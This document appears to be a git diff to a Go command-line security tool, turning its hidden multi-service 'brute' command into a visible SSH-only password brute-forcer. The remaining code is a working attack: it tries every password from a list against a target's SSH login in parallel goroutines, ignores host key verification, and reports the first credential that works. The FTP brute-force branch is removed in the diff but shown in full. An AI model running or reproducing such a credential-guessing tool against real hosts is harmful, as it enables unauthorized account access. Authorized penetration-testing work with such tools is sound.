@@ -26,7 +26,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/go-ping/ping"
 	// "github.com/gocolly/colly"
-	"github.com/jlaffaye/ftp"
+	// "github.com/jlaffaye/ftp"
 	"github.com/spf13/cobra"
 	"golang.org/x/crypto/ssh"
 )
@@ -34,7 +34,7 @@ import (
 // bruteCmd represents the brute command
 type response struct {
 	Hostname string
-	Service  string
+	// Service  string
 	Port     int
 	Username string
 	ListPath string
@@ -61,25 +61,10 @@ var bruteCmd = &cobra.Command{
 		if _, err := ping.NewPinger(answers.Hostname); err != nil {
 			return errors.New(color.RedString("invalid hostname"))
 		}
-		if answers.Service == "" {
-			return errors.New(color.RedString("need the service to brute force"))
-		}
 		answers.Hostname = args[0]
 		return nil
 	},
 	RunE: func(cmd *cobra.Command, args []string) error {
-		if answers.Port == 0 {
-			switch s := answers.Service; s {
-			case "http":
-				answers.Port = 80
-			case "ssh":
-				answers.Port = 22
-			case "ftp":
-				answers.Port = 21
-			default:
-				return errors.New(color.RedString("invalid service"))
-			}
-		}
 		if len(hn) == 2 {
 			answers.Username, answers.Hostname = hn[0], hn[1]
 		}
@@ -94,62 +79,33 @@ var bruteCmd = &cobra.Command{
 		}
 
 		// brute force
-		switch answers.Service {
-
-		//* ssh
-		case "ssh":
-			wg.Add(len(passwords))
-			for _, pass := range passwords {
-				sshConfig := &ssh.ClientConfig{
-					User: answers.Username,
-					Auth: []ssh.AuthMethod{ssh.Password(pass)},
-				}
-				sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()
-				go func(p string) {
-					defer wg.Done()
-					client, err := ssh.Dial("tcp", answers.Hostname+":"+fmt.Sprint(answers.Port), sshConfig)
-					if err != nil {
-						if strings.Contains(err.Error(), "unable to authenticate") {
-							fmt.Println(color.RedString("[-] ") + "authentication for user " + color.CyanString(answers.Username) + " with password " + color.CyanString(p) + " failed")
-							return
-						} else {
-							fmt.Println(color.RedString("[-] ") + err.Error())
-						}
-					}
-					if client != nil {
-						err = client.Close()
-					}
-					if err == nil {
-						fmt.Println(color.GreenString("[+] ") + "successfully authenticated as user " + color.CyanString(answers.Username) + " with password " + color.CyanString(p))
-						os.Exit(0)
-					}
-				}(pass)
-				time.Sleep(time.Duration(answers.Interval) * time.Millisecond)
+		wg.Add(len(passwords))
+		for _, pass := range passwords {
+			sshConfig := &ssh.ClientConfig{
+				User: answers.Username,
+				Auth: []ssh.AuthMethod{ssh.Password(pass)},
 			}
-		case "http":
-			// client := colly.NewCollector()
-			// client.Post()
-		case "ftp":
-			client, err := ftp.Dial(answers.Hostname+":"+fmt.Sprint(answers.Port), ftp.DialWithTimeout(time.Duration(5)*time.Second))
-			if err != nil {
-				return errors.New(color.RedString(err.Error()))
-			}
-			wg.Add(len(passwords))
-			for _, pass := range passwords {
-				go func(p string) {
-					defer wg.Done()
-					fmt.Println(p)
-					err = client.Login(answers.Username, p)
-					if err != nil {
+			sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()
+			go func(p string) {
+				defer wg.Done()
+				client, err := ssh.Dial("tcp", answers.Hostname+":"+fmt.Sprint(answers.Port), sshConfig)
+				if err != nil {
+					if strings.Contains(err.Error(), "unable to authenticate") {
 						fmt.Println(color.RedString("[-] ") + "authentication for user " + color.CyanString(answers.Username) + " with password " + color.CyanString(p) + " failed")
-						fmt.Println(err)
-						err = nil
+						return
 					} else {
-						fmt.Println(color.GreenString("[+] ") + "successfully authenticated as user " + color.CyanString(answers.Username) + " with password " + color.CyanString(p))
-						os.Exit(0)
+						fmt.Println(color.RedString("[-] ") + err.Error())
 					}
-				}(pass)
-			}
+				}
+				if client != nil {
+					err = client.Close()
+				}
+				if err == nil {
+					fmt.Println(color.GreenString("[+] ") + "successfully authenticated as user " + color.CyanString(answers.Username) + " with password " + color.CyanString(p))
+					os.Exit(0)
+				}
+			}(pass)
+			time.Sleep(time.Duration(answers.Interval) * time.Millisecond)
 		}
 		wg.Wait()
 		return nil
@@ -158,16 +114,13 @@ var bruteCmd = &cobra.Command{
 
 func init() {
 	rootCmd.AddCommand(bruteCmd)
-	bruteCmd.Flags().StringVarP(&answers.Service, "service", "s", "", "the service to brute force, accepted values are ftp, http, and ssh")
 	bruteCmd.Flags().StringVarP(&answers.Username, "username", "u", "", "the username of the user to attempt to login to")
-	bruteCmd.Flags().IntVarP(&answers.Port, "port", "p", 0, "the port the service is running on")
+	bruteCmd.Flags().IntVarP(&answers.Port, "port", "p", 22, "the port the service is running on")
 	bruteCmd.Flags().StringVarP(&answers.ListPath, "passwords", "P", "", "list of passwords to try (required)")
 	bruteCmd.Flags().IntVarP(&answers.Interval, "interval", "i", 750, "interval between ssh attempts")
 	bruteCmd.Flags().Lookup("port").Usage = "the port to brute force (required)"
 	bruteCmd.Flags().Lookup("username").Usage = "the username of the user to attempt to login to"
-	bruteCmd.Flags().Lookup("service").Usage = "the service to brute force, accepted values are ftp, http, and ssh"
 
-	bruteCmd.Hidden = true //* wip
 	// Here you will define your flags and configuration settings.
 
 	// Cobra supports Persistent Flags which will work for this command
